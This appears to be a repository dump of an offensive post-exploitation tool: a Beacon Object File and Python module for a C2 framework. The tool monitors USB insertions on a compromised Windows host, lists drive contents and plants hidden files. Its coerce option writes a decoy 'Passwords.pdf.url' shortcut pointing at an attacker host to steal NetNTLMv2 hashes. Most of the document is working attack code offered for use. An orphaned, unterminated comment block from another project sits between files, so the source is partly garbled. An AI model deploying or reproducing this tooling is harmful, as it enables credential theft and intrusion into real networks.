`README.md`:

```md
# USB Monitor

Async BOF that monitors USB device connect/disconnect events and reports device information. When a USB drive is connected, it can list directory contents, upload arbitrary files, or place a malicious `.url` file to capture NetNTLMv2 hashes via forced authentication.

>[!Important]
> This BOF requires asynchronous object file loading capabilities to work without blocking the agent. Such functionality is provided by the [Conquest](https://github.com/jakobfriedl/conquest/) framework.

## How it works 

The BOF registers two separate `CM_Register_Notification` callbacks via `cfgmgr32`:

1. **USB Device callback** (`USB_DEVICE_GUID`): fires on any USB device arrival/removal. Parses `VID`/`PID` from the symbolic link path, retrieves the human-readable device description from the registry via `CM_Get_DevNode_Registry_PropertyW`, and prints device info to the beacon.

2. **USB Volume callback** (`VOLUME_GUID`) :fires only when a USB storage volume is mounted. Resolves the drive letter by matching `QueryDosDeviceW` targets, retrieves the volume label via `GetVolumeInformationA`, then executes the configured actions (bitmask):
    - `ACTION_LIST (0x01)`: Lists contents of the USB drive root directory.
    - `ACTION_PUT (0x02)`: writes the provided file to the USB drive root directory. When a file with the same name exists, it will **not** be overwritten. Optionally sets `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM` when `--hidden` is passed.

The agent is woken up from sleep using `BeaconWakeup` whenever a callback is triggered. 

## Usage

The object file takes the following arguments: 

| Name | Type | Description | 
| --- | --- | --- | 
| `action` | `int` | Bitmask of actions to execute when a USB drive is mounted.<br>- `NONE (0x00)`: monitor only<br>- `LIST (0x01)`: enumerate drive root<br>- `PUT (0x02)`: write file to drive root<br>Flags can be combined (e.g. `0x03` for both listing files and uploading one) | 
| `filename` | `string` | Only used by the `PUT` action. Destination filename on the USB drive. Defaults to the source file's basename, or `Passwords.pdf.url` for the coerce shortcut. | 
| `filecontents` | `bytes` | Only used by the `PUT` action. Raw bytes of the file to write to the USB drive. | 
| `hidden` | `int` | Only used by the `PUT` action. When set to `1`, sets `FILE_ATTRIBUTE_HIDDEN \| FILE_ATTRIBUTE_SYSTEM` on the written file, hiding it from Explorer. |  

The repository contains a [Conquest Module](./dist/usb-monitor.py) which simplifies the use of the `usb-monitor` async BOF. 

```
Usage: usb-monitor [--list] [--put file] [--coerce] [--target target] [--name name] [--hidden]
Example: usb-monitor

Optional arguments:
  --list                    BOOL       List files and directories on the connected USB drive.
  --put file                STRING     Path to the file to upload to the connected USB drive.
  --coerce                  BOOL       Upload a malicious .url file to force NTLM authentication to an attacker-controlled system (requires user interaction).
                                       Requires --target.
  --target target           STRING     Hostname or IP address of attacker-controlled system for coercion.
  --name name               STRING     Name of the uploaded file.
  --hidden                  BOOL       Hide the uploaded file on the USB drive.
```


Note that this module includes the `--coerce` flag. This is a wrapper for the `PUT` action that creates and uploads a malicious `.url` file to the root of the connected USB drive. When this option is set, the `--target` flag is required. The uploaded file has the name `Passwords.pdf.url` by default and the following contents:

```bash
[InternetShortcut]
URL=file://<target>/share
IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe      
IconIndex=11
```

When a victim opens the URL file, a request is made to an attacker-controlled system which leaks the NetNTLMv2 hash for cracking or relaying. 


> [!Caution]
> The URL coercion file is not designed to be stealthy and will raise suspicion when clicked, as it notifies the victim that the destination `\\<target>\share` could not be reached. Consider using zero-click forced authentication exploits that trigger the hash leak automatically when the file explorer opens the USB drive instead of this proof-of-concept.

`dist/usb-monitor.py`:

```py
import conquest
import os.path

ASYNC_DLL = conquest.resources_root() + "/async-bof-loader/dist/async-bof.dll"
EXPORT_FUNC = "Run"
SCRIPT_DIR = os.path.dirname(__file__)

if not os.path.exists(ASYNC_DLL):
    raise FileNotFoundError(f"Async BOF DLL not found: {ASYNC_DLL}")

# Action type bitmask (list & put can be used simultaneously)
ACTION_NONE = 0         # 0x00
ACTION_LIST = 1 << 0    # 0x01 
ACTION_PUT = 1 << 1     # 0x02

def create_url(host):
    return (
        "[InternetShortcut]\r\n"
        f"URL=file://{host}/share\r\n"
        "IconFile=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\r\n"
        "IconIndex=11\r\n"
    ).encode('utf-8')

def _usbMonitor(agentId, cmdline, args):
    list_files = conquest.get_bool(args, 0)
    put_file_path = conquest.get_string(args, 1)
    coerce = conquest.get_bool(args, 2)
    target = conquest.get_string(args, 3)
    name = conquest.get_string(args, 4)
    hidden = conquest.get_bool(args, 5)

    action = ACTION_NONE
    file_contents = b""
    file_name = ""

    # Directory listing
    if list_files:
        action |= ACTION_LIST

    # File upload
    if put_file_path:
        try:
            with open(put_file_path, 'rb') as f:
                file_contents = f.read()
        except Exception as e:
            conquest.error(agentId, f"Failed to read file: {e}", cmdline)
            return
        action |= ACTION_PUT
        file_name = name if name else os.path.basename(put_file_path)

    # Coercion
    elif coerce:
        if not target:
            conquest.error(agentId, "Missing required flag: --target", cmdline)
            return

        action |= ACTION_PUT
        file_contents = create_url(target)
        file_name = name if name else "Passwords.pdf.url"
        
    bof = os.path.join(SCRIPT_DIR, "usb-monitor.x64.o")
    params = conquest.bof_pack("izbi", [
        action,
        file_name,
        file_contents,
        int(hidden),
    ])

    if os.path.exists(bof):
        conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}")
    else:
        conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)

cmd_usbMonitor = (
    conquest.createCommand(name="usb-monitor", description="Notify when a USB device is connected/disconnected (async).", example="usb-monitor",
                           message="Tasked agent to notify when a USB device is connected or disconnected.", mitre=["T1120"])
            .addFlagBool("--list", "list-files", "List files and directories on the connected USB drive.")
            .addFlagString("--put", "file", "Path to the file to upload to the connected USB drive.")
            .addFlagBool("--coerce", "coerce", "Upload a malicious .url file to force NTLM authentication to an attacker-controlled system (requires user interaction).\nRequires --target.")
            .addFlagString("--target", "target", "Hostname or IP address of attacker-controlled system for coercion.")
            .addFlagString("--name", "name", "Name of the uploaded file.")
            .addFlagBool("--hidden", "hidden", "Hide the uploaded file on the USB drive.")
            .setHandler(_usbMonitor)
).registerToGroup("situational awareness")

/*
 *  version               - The version of the beacon dll was added for release 4.10
 *                          version format: 0xMMmmPP, where MM = Major, mm = Minor, and PP = Patch
 *                          e.g. 0x040900 -> CS 4.9
 *                               0x041000 -> CS 4.10
 *
 *  sleep_mask_ptr        - pointer to the sleep mask base address
 *  sleep_mask_text_size  - the sleep mask text section size
 *  sleep_mask_total_size - the sleep mask total memory size
 *
 *  beacon_ptr   - pointer to beacon's base address
 *                 The stage.obfuscate flag affects this value when using CS default loader.
 *                    true:  beacon_ptr = allocated_buffer - 0x1000 (Not a valid address)
 *                    false: beacon_ptr = allocated_buffer (A valid address)
 *                 For a UDRL the beacon_ptr will be set to the 1st argument to DllMain
 *                 when the 2nd argument is set to DLL_PROCESS_ATTACH.
 *  heap_records - list of memory addresses on the heap beacon wants to mask.
 *                 The list is terminated by the HEAP_RECORD.ptr set to NULL.
 *  mask         - the mask that beacon randomly generated to apply
 *
 *  Added in version 4.10
 *  allocatedMemory - An ALLOCATED_MEMORY structure that can be set in the USER_DATA
 *                     via a UDRL.

#include <windows.h>
#include <cfgmgr32.h>
#include "beacon.h"
#include "common.h"

/*
    Global variables
*/

#define ACTION_LIST 0x01
#define ACTION_PUT  0x02

int   g_action          = 0;
char *g_fileName        = NULL;
char *g_fileContents    = NULL;
int   g_fileContentsLen = 0;
int   g_hidden          = 0;

/* 
    Retrieve drive letter
*/
CHAR VolumeGetDriveLetter(LPCWSTR symLink) {
    // Strip "\\?\" prefix
    LPCWSTR dosName = (symLink[0]==L'\\' && symLink[1]==L'\\' && symLink[2]==L'?' && symLink[3]==L'\\') ? symLink + 4 : symLink;

    WCHAR symTarget[MAX_PATH];
    WCHAR driveLetter[3] = { L'A', L':', L'\0' };
    WCHAR driveTarget[MAX_PATH];
    
    if (!KERNEL32$QueryDosDeviceW(dosName, symTarget, MAX_PATH))
        return '?';
                      
    // Iterate over possible drive letters 
    for (WCHAR c = L'A'; c <= L'Z'; c++) {
        driveLetter[0] = c;
        MSVCRT$memset(driveTarget, 0, sizeof(driveTarget));
        
        if (KERNEL32$QueryDosDeviceW(driveLetter, driveTarget, MAX_PATH)) {
            if (MSVCRT$wcsncmp(symTarget, driveTarget, MAX_PATH) == 0)
                return (CHAR)c;
        }
    }
    return '?';
}

/*
    Retrieve VID and PID
*/ 
VOID ParseDevicePath(LPCWSTR devicePath, PWORD vid, PWORD pid) {
    *vid = 0;
    *pid = 0;

    LPCWSTR p = MSVCRT$wcsstr(devicePath, L"VID_");
    if (p) {
        p += 4;
        WORD v = 0;
        for (INT i = 0; i < 4; i++) {
            WCHAR c = p[i];
            v <<= 4;
            if (c >= L'0' && c <= L'9')      v |= c - L'0';
            else if (c >= L'A' && c <= L'F') v |= c - L'A' + 10;
            else if (c >= L'a' && c <= L'f') v |= c - L'a' + 10;
        }
        *vid = v;
    }

    p = MSVCRT$wcsstr(devicePath, L"PID_");
    if (p) {
        p += 4;
        WORD v = 0;
        for (INT i = 0; i < 4; i++) {
            WCHAR c = p[i];
            v <<= 4;
            if (c >= L'0' && c <= L'9')      v |= c - L'0';
            else if (c >= L'A' && c <= L'F') v |= c - L'A' + 10;
            else if (c >= L'a' && c <= L'f') v |= c - L'a' + 10;
        }
        *pid = v;
    }
}

/*
    Retrieve human-readable type of connected USB device
*/
VOID GetDeviceDescription(LPCWSTR symLink, LPSTR descOut, DWORD maxLen) {
    // Strip "\\?\" prefix
    LPCWSTR src = (symLink[0]==L'\\' && symLink[1]==L'\\' && symLink[2]==L'?' && symLink[3]==L'\\') ? symLink + 4 : symLink;

    WCHAR instanceId[MAX_PATH];
    DWORD j = 0;
    while (src[j] && j < MAX_PATH - 1) {
        if (src[j] == L'#' && src[j+1] == L'{') break;
        instanceId[j] = (src[j] == L'#') ? L'\\' : src[j];
        j++;
    }
    instanceId[j] = L'\0';

    DEVINST devInst;
    if (CFGMGR32$CM_Locate_DevNodeW(&devInst, instanceId, CM_LOCATE_DEVNODE_NORMAL) != CR_SUCCESS) {
        descOut[0] = '\0';
        return;
    }

    WCHAR descW[MAX_PATH];
    ULONG len = sizeof(descW);
    if (CFGMGR32$CM_Get_DevNode_Registry_PropertyW(devInst, CM_DRP_DEVICEDESC, NULL, descW, &len, 0) != CR_SUCCESS) {
        descOut[0] = '\0';
        return;
    }

    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, descW, -1, descOut, maxLen - 1, NULL, NULL);
    descOut[maxLen - 1] = '\0';
}

/* 
    Retrieve drive directory contents
*/
VOID PrintVolumeContents(LPCSTR path) {
    WCHAR patternW[MAX_PATH];
    INT i = 0;
    while (path[i] && i < MAX_PATH - 2) { patternW[i] = (WCHAR)path[i]; i++; }
    patternW[i++] = L'*';
    patternW[i]   = L'\0';

    BeaconPrintf(CALLBACK_OUTPUT, "\n%-5s   %-25s%-15s%s\n%-5s   %-25s%-15s%s\n", path, "Flags", "Last modified",  "Size", "Name", "-----", "-------------",  "----", "----");

    DWORD fileCount = 0, dirCount = 0;
    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    for (INT pass = 0; pass < 2; pass++) {
        hFind = KERNEL32$FindFirstFileW(patternW, &findData);
        if (hFind == INVALID_HANDLE_VALUE)
            continue;

        while (TRUE) {
            BOOL isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            BOOL isDot = findData.cFileName[0] == L'.' && (findData.cFileName[1] == L'\0' || (findData.cFileName[1] == L'.' && findData.cFileName[2] == L'\0'));

            if (!isDot && ((pass == 0) == (isDir != 0))) {
                DWORD attrs = findData.dwFileAttributes;
                CHAR flags[6] = {
                    isDir                             ? 'd' : '-',
                    (attrs & FILE_ATTRIBUTE_ARCHIVE)  ? 'a' : '-',
                    (attrs & FILE_ATTRIBUTE_READONLY) ? 'r' : '-',
                    (attrs & FILE_ATTRIBUTE_HIDDEN)   ? 'h' : '-',
                    (attrs & FILE_ATTRIBUTE_SYSTEM)   ? 's' : '-',
                    '\0'
                };

                FILETIME localFt;
                SYSTEMTIME st;
                KERNEL32$FileTimeToLocalFileTime(&findData.ftLastWriteTime, &localFt);
                KERNEL32$FileTimeToSystemTime(&localFt, &st);

                CHAR name[MAX_PATH * 4];
                KERNEL32$WideCharToMultiByte(CP_UTF8, 0, findData.cFileName, -1, name, sizeof(name) - 1, NULL, NULL);
                name[sizeof(name) - 1] = '\0';

                if (isDir) {
                    BeaconPrintf(CALLBACK_OUTPUT, "%-5s   %02d/%02d/%04d %02d:%02d:%02d      %-15s%s\n", flags, st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond, "<DIR>", name);
                    dirCount++;
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "%-5s   %02d/%02d/%04d %02d:%02d:%02d      %-15lu%s\n", flags, st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond, findData.nFileSizeLow, name);
                    fileCount++;
                }
            }

            if (!KERNEL32$FindNextFileW(hFind, &findData))
                break;
        }
        KERNEL32$FindClose(hFind);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n%lu file(s)\n%lu dir(s)\n", fileCount, dirCount);
}

/*
    Write file to USB drive
*/
VOID PutFile(LPCSTR rootPath, LPCSTR fileName, char *contents, int contentsLen, int hidden) {
    CHAR fullPath[MAX_PATH];
    INT i = 0, j = 0;
    while (rootPath[i] && i < MAX_PATH - 1) { fullPath[i] = rootPath[i]; i++; }
    while (fileName[j]  && i < MAX_PATH - 1) { fullPath[i++] = fileName[j++]; }
    fullPath[i] = '\0';

    HANDLE hFile = KERNEL32$CreateFileA(fullPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create file: %s (error: %lu)\n", fullPath, KERNEL32$GetLastError());
        return;
    }

    DWORD written = 0;
    KERNEL32$WriteFile(hFile, contents, (DWORD)contentsLen, &written, NULL);
    KERNEL32$CloseHandle(hFile);

    if (hidden)
        KERNEL32$SetFileAttributesA(fullPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] File created: %s (%lu bytes)\n", fullPath, written);
}

/*
    Regular USB device callback function
*/
DWORD CALLBACK UsbNotifyCallback(HCMNOTIFICATION hNotify, PVOID context, CM_NOTIFY_ACTION action, PCM_NOTIFY_EVENT_DATA eventData, DWORD eventDataSize) {
    LPCWSTR symLink = eventData->u.DeviceInterface.SymbolicLink;
    WORD vid = 0, pid = 0;
    ParseDevicePath(symLink, &vid, &pid);
    
    switch(action){
        case CM_NOTIFY_ACTION_DEVICEINTERFACEARRIVAL:
            CHAR path[MAX_PATH];
            CHAR desc[MAX_PATH];
            
            INT i = 0;
            while (symLink[i] && i < MAX_PATH - 1) {
                path[i] = (CHAR)symLink[i]; i++;
            }
            path[i] = '\0';
            
            GetDeviceDescription(symLink, desc, MAX_PATH);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] USB Device Connected:\n\tVID  : %04X\n\tPID  : %04X\n\tType : %s\n\tPath : %s\n", vid, pid, desc, path);
            break;

        case CM_NOTIFY_ACTION_DEVICEINTERFACEREMOVAL:
            BeaconPrintf(CALLBACK_OUTPUT, "[-] USB Device Disconnected:\n\tVID  : %04X\n\tPID  : %04X\n", vid, pid);
            break;     
        
        default:    
            break;  
    }
    
    BeaconWakeup();
    return ERROR_SUCCESS;
}

/*
    USB drive/volume callback function
*/
DWORD CALLBACK VolumeNotifyCallback(HCMNOTIFICATION hNotify, PVOID context, CM_NOTIFY_ACTION action, PCM_NOTIFY_EVENT_DATA eventData, DWORD eventDataSize) {
    if (action != CM_NOTIFY_ACTION_DEVICEINTERFACEARRIVAL)
        return ERROR_SUCCESS;

    CHAR driveLetter = VolumeGetDriveLetter(eventData->u.DeviceInterface.SymbolicLink);
    CHAR rootPath[4] = { driveLetter, ':', '\\', '\0' };
    CHAR volumeName[MAX_PATH];
    MSVCRT$memset(volumeName, 0, sizeof(volumeName));
    KERNEL32$GetVolumeInformationA(rootPath, volumeName, MAX_PATH, NULL, NULL, NULL, NULL, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] USB Volume Connected:\n\tDrive Letter : %c:\\\n\tVolume Name  : %s\n", driveLetter, volumeName);
    
    // Action: Upload file to the connected drive
    if(g_action & ACTION_PUT){
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Action: Creating file %s in %s\n", g_fileName, rootPath); 
        PutFile(rootPath, g_fileName, g_fileContents, g_fileContentsLen, g_hidden);
    }
    
    // Action: List drive directory contents
    if(g_action & ACTION_LIST ){
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Action: Listing files and directories in %s\n", rootPath); 
        PrintVolumeContents(rootPath); 
    } 

    BeaconWakeup();
    return ERROR_SUCCESS;
}

/*
    Entry point
*/
VOID go(char* args, int argc) {

    datap parser; 
    HANDLE hStop = BeaconGetStopJobEvent();

    BeaconDataParse(&parser, args, argc); 
    g_action = BeaconDataInt(&parser); 
    g_fileName = BeaconDataExtract(&parser, NULL); 
    g_fileContents = BeaconDataExtract(&parser, &g_fileContentsLen);
    g_hidden = BeaconDataInt(&parser); 

    // Register notification handler for generic USB devices
    CM_NOTIFY_FILTER usbFilter;
    MSVCRT$memset(&usbFilter, 0, sizeof(usbFilter));
    usbFilter.cbSize = sizeof(usbFilter);
    usbFilter.FilterType = CM_NOTIFY_FILTER_TYPE_DEVICEINTERFACE;
    usbFilter.u.DeviceInterface.ClassGuid = USB_DEVICE_GUID;

    HCMNOTIFICATION hUsbNotify = NULL;
    if (CFGMGR32$CM_Register_Notification(&usbFilter, NULL, UsbNotifyCallback, &hUsbNotify) != CR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CM_Register_Notification (USB) failed\n");
        return;
    }

    // Register notification handler for USB drives/volumes
    CM_NOTIFY_FILTER volumeFilter;
    MSVCRT$memset(&volumeFilter, 0, sizeof(volumeFilter));
    volumeFilter.cbSize = sizeof(volumeFilter);
    volumeFilter.FilterType = CM_NOTIFY_FILTER_TYPE_DEVICEINTERFACE;
    volumeFilter.u.DeviceInterface.ClassGuid = VOLUME_GUID;

    HCMNOTIFICATION hVolumeNotify = NULL;
    if (CFGMGR32$CM_Register_Notification(&volumeFilter, NULL, VolumeNotifyCallback, &hVolumeNotify) != CR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CM_Register_Notification (Volume) failed\n");
        CFGMGR32$CM_Unregister_Notification(hUsbNotify);
        return;
    }

    // Wait until stop event is triggered
    KERNEL32$WaitForMultipleObjects(1, &hStop, FALSE, INFINITE);

    // Cleanup
    CFGMGR32$CM_Unregister_Notification(hVolumeNotify);
    CFGMGR32$CM_Unregister_Notification(hUsbNotify);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] BOF execution completed.\n");
    return; 
}
